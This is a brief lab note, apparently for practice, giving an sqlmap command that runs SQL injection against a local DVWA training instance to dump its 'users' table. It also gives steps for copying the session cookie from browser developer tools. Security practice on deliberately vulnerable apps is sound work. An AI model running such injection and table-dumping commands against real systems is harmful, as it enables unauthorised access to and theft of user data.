Command for SQLMap:  `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE_VALUE; security=low" --dump -T users`

To find Cookie value:
1. Open DVWA
2. F12 (Developer Options)
3. Storage
4. Copy PHPSESSID for the localhost URL
